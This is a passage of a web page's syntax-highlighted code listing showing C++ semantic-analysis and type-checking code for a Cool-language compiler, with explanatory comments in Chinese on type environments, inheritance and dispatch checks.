class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassTable</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">typedef</span> std::unordered_map&lt;Symbol, attr_class*&gt; Attr_type;</span><br><span class="line">  <span class="keyword">typedef</span> std::unordered_map&lt;Symbol, method_class*&gt; Method_type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 即Cool-Manual中定义的Type Environments</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * 按照手册可知</span></span><br><span class="line"><span class="comment">   * 其应该至少包含三部分</span></span><br><span class="line"><span class="comment">   * 1. Method Environment</span></span><br><span class="line"><span class="comment">   * 2. Object Environment</span></span><br><span class="line"><span class="comment">   * 3. 当前类名称</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 除此之外，其应该提供如下方法</span></span><br><span class="line"><span class="comment">   * 1. M(v) = T，即根据对象名称返回其类型</span></span><br><span class="line"><span class="comment">   * 2. M(C, f) = (T1, ...., Tn - 1, Tn)，级根据方法名称返回一系列特征</span></span><br><span class="line"><span class="comment">   * 3. 返回SELF_TYPE类型，即当前类名称</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  SymbolTable&lt;Symbol, Class_&gt; *object_environment;</span><br><span class="line">  std::unordered_map&lt;Symbol, Attr_type*&gt; *attr_environment;</span><br><span class="line">  std::unordered_map&lt;Symbol, Method_type*&gt; *method_environment;</span><br><span class="line">  Symbol self;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 对于enter_scope和exit_scope，除了设置self及相关参数以外，还需要进行额外的检查</span></span><br><span class="line"><span class="comment">   * 而对于object_enter_scope和object_exit_scope外，则简单的调用相关方法即可</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">object_enter_scope</span><span class="params">()</span> </span>&#123; object_environment-&gt;<span class="built_in">enterscope</span>(); &#125;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">object_exit_scope</span><span class="params">()</span> </span>&#123; object_environment-&gt;<span class="built_in">exitscope</span>(); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 当前scope中已经不存在相同名称变量</span></span><br><span class="line"><span class="comment">   * 其类型也是有效的</span></span><br><span class="line"><span class="comment">   * 直接添加即可</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">object_add</span><span class="params">(Symbol symbol, Symbol class_)</span> </span>&#123; object_environment-&gt;<span class="built_in">addid</span>(symbol, <span class="keyword">new</span> <span class="built_in">Class_</span>(symbol_to_class[class_])); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 在当前的scope中，查找变量对应的类型</span></span><br><span class="line"><span class="comment">   * 也就是调用object_environment即可</span></span><br><span class="line"><span class="comment">   * 如果变量不存在，则返回nullptr</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">Symbol <span class="title">lookup_object</span><span class="params">(Symbol symbol)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">enter_scope</span><span class="params">(Symbol class_)</span> </span>&#123;</span><br><span class="line">    self = class_;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(attr_environment-&gt;<span class="built_in">find</span>(self) == attr_environment-&gt;<span class="built_in">end</span>()) &#123; attr_environment-&gt;<span class="built_in">insert</span>(std::<span class="built_in">pair</span>&lt;Symbol, Attr_type*&gt;(self, <span class="keyword">new</span> <span class="built_in">Attr_type</span>())); &#125;</span><br><span class="line">    <span class="keyword">if</span>(method_environment-&gt;<span class="built_in">find</span>(self) == method_environment-&gt;<span class="built_in">end</span>()) &#123; method_environment-&gt;<span class="built_in">insert</span>(std::<span class="built_in">pair</span>&lt;Symbol, Method_type*&gt;(self, <span class="keyword">new</span> <span class="built_in">Method_type</span>())); &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">exit_scope</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assert_self</span>();</span><br><span class="line">    self = <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">Symbol <span class="title">probe</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> self; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * arg1： Symbol class_             待查找的类符号</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * 查找程序中是否存在class_的类</span></span><br><span class="line"><span class="comment">   * 如果存在，则返回Class_即可</span></span><br><span class="line"><span class="comment">   * 否则，返回nullptr</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">Symbol <span class="title">lookup_class</span><span class="params">(Symbol class_)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * arg1:  Symbol a                类符号</span></span><br><span class="line"><span class="comment">   * arg2:  Symbol b                类符号</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 判断a是否继承自b</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isInherits</span><span class="params">(Symbol a, Symbol b)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * arg1: Symbol a                 继承树的节点1</span></span><br><span class="line"><span class="comment">   * arg2: Symbol b                 继承树的节点2</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 找到a和b最近的公共祖先</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">Symbol <span class="title">findLowestCommonAncestor</span><span class="params">(Symbol a, Symbol b)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * arg1: Symbol class_            即要分发的类</span></span><br><span class="line"><span class="comment">   * arg2: Symbol method            要分发的类的方法名称</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 查找class_.method的函数信息</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">method_class *<span class="title">lookup_method</span><span class="params">(Symbol class_, Symbol method)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    class_ = <span class="built_in">lookup_class</span>(class_);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(method_environment-&gt;<span class="built_in">find</span>(class_) == method_environment-&gt;<span class="built_in">end</span>()) &#123; <span class="keyword">return</span> <span class="literal">nullptr</span>; &#125;</span><br><span class="line"></span><br><span class="line">    Method_type *method_map = method_environment-&gt;<span class="built_in">at</span>(class_);</span><br><span class="line">    <span class="keyword">if</span>(method_map-&gt;<span class="built_in">find</span>(method) == method_map-&gt;<span class="built_in">end</span>()) &#123;<span class="keyword">return</span> <span class="literal">nullptr</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> method_map-&gt;<span class="built_in">at</span>(method);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * arg1： Symbol class_             待查找的类符号</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 查找程序中是否存在class_的类</span></span><br><span class="line"><span class="comment"> * 如果存在，则返回相关的Symbol</span></span><br><span class="line"><span class="comment"> * 否则，返回nullptr</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">Symbol <span class="title">ClassTable::lookup_class</span><span class="params">(Symbol class_)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(class_ == SELF_TYPE) &#123; class_ = <span class="built_in">probe</span>(); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(symbol_to_class.<span class="built_in">find</span>(class_) != symbol_to_class.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> class_;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * arg1: Classes classes        程序的类集合</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 实际上，也就是遍历类的成员方法</span></span><br><span class="line"><span class="comment"> * 检查成员方法中表达式的合法性</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 也就是通过在Feature、Expression_class和Case_class中实现check_type()方法</span></span><br><span class="line"><span class="comment"> * 从而实现类型检查和类型推断功能</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 之后只要在每一个Feature中调用check_type，其会递归的调用check_type，从而完成最终的类型检查</span></span><br><span class="line"><span class="comment"> * 这里调用check_type时，其预期的返回值类型总是Object(从而兼容绝大多数的返回值类型)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClassTable::check_types</span><span class="params">(Classes classes)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = classes-&gt;<span class="built_in">first</span>(); classes-&gt;<span class="built_in">more</span>(i); i = classes-&gt;<span class="built_in">next</span>(i)) &#123;</span><br><span class="line"></span><br><span class="line">        Class_ class_ = classes-&gt;<span class="built_in">nth</span>(i);</span><br><span class="line">        Features features = class_-&gt;<span class="built_in">get_features</span>();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">enter_scope</span>(class_-&gt;<span class="built_in">get_name</span>());</span><br><span class="line">        <span class="built_in">object_enter_scope</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = features-&gt;<span class="built_in">first</span>(); features-&gt;<span class="built_in">more</span>(j); j = features-&gt;<span class="built_in">next</span>(j)) &#123; features-&gt;<span class="built_in">nth</span>(j)-&gt;<span class="built_in">check_type</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">        <span class="built_in">object_exit_scope</span>();</span><br><span class="line">        <span class="built_in">exit_scope</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * arg1:  Symbol a                类符号</span></span><br><span class="line"><span class="comment"> * arg2:  Symbol b                类符号</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 判断a是否继承自b</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ClassTable::isInherits</span><span class="params">(Symbol a, Symbol b)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    a = <span class="built_in">lookup_class</span>(a);</span><br><span class="line">    b = <span class="built_in">lookup_class</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(a == b) &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line">        <span class="keyword">if</span>(a == Object) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line"></span><br><span class="line">        a = inherits[a];</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * arg1: Symbol symbol             要查找的变量</span></span><br><span class="line"><span class="comment"> * 在当前的scope中，查找变量对应的类型</span></span><br><span class="line"><span class="comment"> * 也就是调用object_environment即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">Symbol <span class="title">ClassTable::lookup_object</span><span class="params">(Symbol symbol)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(symbol == ::self) &#123; <span class="keyword">return</span> SELF_TYPE; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//首先在object_environment中查找</span></span><br><span class="line">    Class_ *class_ = (object_environment-&gt;<span class="built_in">lookup</span>(symbol));</span><br><span class="line">    <span class="keyword">if</span>(class_ != <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> (*class_)-&gt;<span class="built_in">get_name</span>(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果在object中没找到，则在当前类中进行查找</span></span><br><span class="line">    Attr_type *attr_map = attr_environment-&gt;<span class="built_in">at</span>(<span class="built_in">probe</span>());</span><br><span class="line">    <span class="keyword">if</span>(attr_map-&gt;<span class="built_in">find</span>(symbol) != attr_map-&gt;<span class="built_in">end</span>()) &#123; <span class="keyword">return</span> attr_map-&gt;<span class="built_in">at</span>(symbol)-&gt;<span class="built_in">get_type</span>(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果未定义该变量，则直接返回nullptr即可</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * arg1: Symbol a                 继承树的节点1</span></span><br><span class="line"><span class="comment"> * arg2: Symbol b                 继承树的节点2</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 找到a和b最近的公共祖先</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">Symbol <span class="title">ClassTable::findLowestCommonAncestor</span><span class="params">(Symbol a, Symbol b)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 基本思路就是保存a的路径</span></span><br><span class="line"><span class="comment">   * 然后依次遍历b的路径即可</span></span><br><span class="line"><span class="comment">   * 直到找到第一个出现在a路径中的节点为止</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 这里不需要考虑a/b非法的情况</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    a = <span class="built_in">lookup_class</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(a == b) &#123; <span class="keyword">return</span> a;&#125;</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="literal">nullptr</span>) &#123; <span class="keyword">return</span> b; &#125;</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="literal">nullptr</span>) &#123; <span class="keyword">return</span> a; &#125;</span><br><span class="line"></span><br><span class="line">    std::unordered_set&lt;Symbol&gt; sets;</span><br><span class="line">    <span class="keyword">while</span>(a != Object) &#123;</span><br><span class="line">        sets.<span class="built_in">insert</span>(a);</span><br><span class="line">        a = inherits[a];</span><br><span class="line">    &#125;</span><br><span class="line">    sets.<span class="built_in">insert</span>(Object);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//遍历b的路径并判断</span></span><br><span class="line">    <span class="keyword">while</span>(b != Object) &#123;</span><br><span class="line">        <span class="keyword">if</span>(sets.<span class="built_in">find</span>(<span class="built_in">lookup_class</span>(b)) != sets.<span class="built_in">end</span>()) &#123; <span class="keyword">return</span> b; &#125;</span><br><span class="line">        b = inherits[<span class="built_in">lookup_class</span>(b)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//理论上执行不到这里</span></span><br><span class="line">    <span class="keyword">return</span> Object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这里实现具体的类型检查和类型推断</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">Symbol <span class="title">attr_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要检查如下规则</span></span><br><span class="line"><span class="comment">     * 1. attr属性是合法的</span></span><br><span class="line"><span class="comment">     * 2. attr属性和表达式一致</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol symbol = class_table-&gt;<span class="built_in">lookup_class</span>(<span class="built_in">get_type</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// attr属性不合法</span></span><br><span class="line">    <span class="keyword">if</span>(symbol == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; </span><br><span class="line">        <span class="string">&quot;Class &quot;</span> &lt;&lt; <span class="built_in">get_type</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt;</span><br><span class="line">        <span class="string">&quot; of attribute &quot;</span> &lt;&lt; <span class="built_in">get_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt;</span><br><span class="line">        <span class="string">&quot; is undefined.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为了类型检查可以继续</span></span><br><span class="line">        symbol = Object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//确保表达式和属性类型一致</span></span><br><span class="line">    Symbol return_type = <span class="keyword">this</span>-&gt;<span class="built_in">get_init</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">    <span class="keyword">if</span>(return_type != No_class &amp;&amp; !class_table-&gt;<span class="built_in">isInherits</span>(return_type, symbol)) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Inferred type &quot;</span> &lt;&lt;</span><br><span class="line">        return_type-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; of initialization of attribute a does not conform to declared type &quot;</span>  &lt;&lt;</span><br><span class="line">        symbol-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> No_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">method_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要检查如下规则</span></span><br><span class="line"><span class="comment">     * 1. method的参数是有效参数</span></span><br><span class="line"><span class="comment">     * 2. method的返回值是有效返回值</span></span><br><span class="line"><span class="comment">     * 3. method的返回值和实际的返回值一致</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    class_table-&gt;<span class="built_in">object_enter_scope</span>();</span><br><span class="line"></span><br><span class="line">    Formals formals = <span class="keyword">this</span>-&gt;<span class="built_in">get_formals</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查method的类型是否为有效类型</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = formals-&gt;<span class="built_in">first</span>(); formals-&gt;<span class="built_in">more</span>(i); i = formals-&gt;<span class="built_in">next</span>(i)) &#123;</span><br><span class="line"></span><br><span class="line">        Formal formal = formals-&gt;<span class="built_in">nth</span>(i);</span><br><span class="line">        <span class="keyword">if</span>(formal-&gt;<span class="built_in">get_type</span>() == SELF_TYPE) &#123;</span><br><span class="line">            class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt;</span><br><span class="line">            <span class="string">&quot;Formal parameter &quot;</span> &lt;&lt; formal-&gt;<span class="built_in">get_name</span>() &lt;&lt; <span class="string">&quot; cannot have type SELF_TYPE.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//为了确保后续正常解析，设置参数类型为Object</span></span><br><span class="line">            class_table-&gt;<span class="built_in">object_add</span>(formal-&gt;<span class="built_in">get_name</span>(), class_table-&gt;<span class="built_in">lookup_class</span>(Object));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(class_table-&gt;<span class="built_in">lookup_class</span>(formal-&gt;<span class="built_in">get_type</span>()) == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt;</span><br><span class="line">            <span class="string">&quot;Class &quot;</span> &lt;&lt; formal-&gt;<span class="built_in">get_type</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt;</span><br><span class="line">            <span class="string">&quot; of formal parameter &quot;</span> &lt;&lt; formal-&gt;<span class="built_in">get_name</span>() &lt;&lt; <span class="string">&quot; is undefined.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//为了确保后续正常解析，设置参数类型为Object</span></span><br><span class="line">            class_table-&gt;<span class="built_in">object_add</span>(formal-&gt;<span class="built_in">get_name</span>(), class_table-&gt;<span class="built_in">lookup_class</span>(Object));</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123; class_table-&gt;<span class="built_in">object_add</span>(formal-&gt;<span class="built_in">get_name</span>(), class_table-&gt;<span class="built_in">lookup_class</span>(formal-&gt;<span class="built_in">get_type</span>())); &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查method的返回值是否为有效值</span></span><br><span class="line">    Symbol symbol = <span class="built_in">get_return_type</span>();</span><br><span class="line">    <span class="keyword">if</span>(class_table-&gt;<span class="built_in">lookup_class</span>(symbol) == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt;</span><br><span class="line">        <span class="string">&quot;Undefined return type &quot;</span> &lt;&lt; <span class="built_in">get_return_type</span>()-&gt;<span class="built_in">get_string</span>()</span><br><span class="line">        &lt;&lt; <span class="string">&quot; in method &quot;</span> &lt;&lt; <span class="built_in">get_name</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123; symbol = class_table-&gt;<span class="built_in">lookup_class</span>(symbol); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查method的返回值和实际的返回值一致</span></span><br><span class="line">    Symbol return_type = <span class="keyword">this</span>-&gt;<span class="built_in">get_expr</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">    <span class="keyword">if</span>(!class_table-&gt;<span class="built_in">isInherits</span>(return_type, symbol)) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt;</span><br><span class="line">        <span class="string">&quot;Inferred return type &quot;</span> &lt;&lt; return_type-&gt;<span class="built_in">get_string</span>() &lt;&lt;</span><br><span class="line">        <span class="string">&quot; of method &quot;</span> &lt;&lt; <span class="built_in">get_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; does not conform to declared return type &quot;</span> &lt;&lt; </span><br><span class="line">        symbol-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class_table-&gt;<span class="built_in">object_exit_scope</span>();</span><br><span class="line">    <span class="keyword">return</span> No_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">branch_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下规则的检查</span></span><br><span class="line"><span class="comment">     * 1. 类型是合法的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol name = <span class="built_in">get_name</span>(), type = <span class="built_in">get_type_decl</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(class_table-&gt;<span class="built_in">lookup_class</span>(type) == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Class &quot;</span></span><br><span class="line">        &lt;&lt; type-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; of case branch is undefined.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方便进行处理</span></span><br><span class="line">        type = Object;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123; type = class_table-&gt;<span class="built_in">lookup_class</span>(type); &#125;</span><br><span class="line"></span><br><span class="line">    class_table-&gt;<span class="built_in">object_enter_scope</span>();</span><br><span class="line"></span><br><span class="line">    class_table-&gt;<span class="built_in">object_add</span>(name, type);</span><br><span class="line">    Symbol return_type = <span class="built_in">get_expr</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    class_table-&gt;<span class="built_in">object_exit_scope</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> return_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">assign_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下规则的检查</span></span><br><span class="line"><span class="comment">     * 1. 变量名称之前存在</span></span><br><span class="line"><span class="comment">     * 3. 表达式类型是变量类型的继承类型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查变量名是否存在</span></span><br><span class="line">    Symbol type = class_table-&gt;<span class="built_in">lookup_object</span>(<span class="built_in">get_name</span>());</span><br><span class="line">    <span class="keyword">if</span>(type == <span class="literal">nullptr</span>) &#123;</span><br><span class="line"></span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Assignment to undeclared variable &quot;</span></span><br><span class="line">        &lt;&lt; <span class="built_in">get_name</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//简单的处理方式</span></span><br><span class="line">        type = Object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查表达式类型是变量类型的继承类型</span></span><br><span class="line">    Symbol return_type = <span class="built_in">get_expr</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">    <span class="keyword">if</span>(!class_table-&gt;<span class="built_in">isInherits</span>(return_type, type)) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Type &quot;</span></span><br><span class="line">        &lt;&lt; return_type-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; of assigned expression does not conform to declared type &quot;</span></span><br><span class="line">        &lt;&lt; type-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; of identifier &quot;</span> &lt;&lt; <span class="built_in">get_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(return_type);</span><br><span class="line">    <span class="keyword">return</span> return_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">static_dispatch_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要做如下规则检查</span></span><br><span class="line"><span class="comment">     * 1. 验证类型有意义</span></span><br><span class="line"><span class="comment">     * 2. 相关的函数有定义</span></span><br><span class="line"><span class="comment">     * 3. 参数列表个数</span></span><br><span class="line"><span class="comment">     * 4. 参数列表内容</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//验证静态类型有意义</span></span><br><span class="line">    Symbol expr = <span class="built_in">get_expr</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">    <span class="keyword">if</span>(class_table-&gt;<span class="built_in">lookup_class</span>(<span class="built_in">get_type_name</span>()) == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Static dispatch to undefined class &quot;</span></span><br><span class="line">        &lt;&lt; <span class="built_in">get_type_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法不存在，则后面无需在进行检查</span></span><br><span class="line">        <span class="built_in">set_type</span>(Object);</span><br><span class="line">        <span class="keyword">return</span> Object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!class_table-&gt;<span class="built_in">isInherits</span>(expr, <span class="built_in">get_type_name</span>())) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) 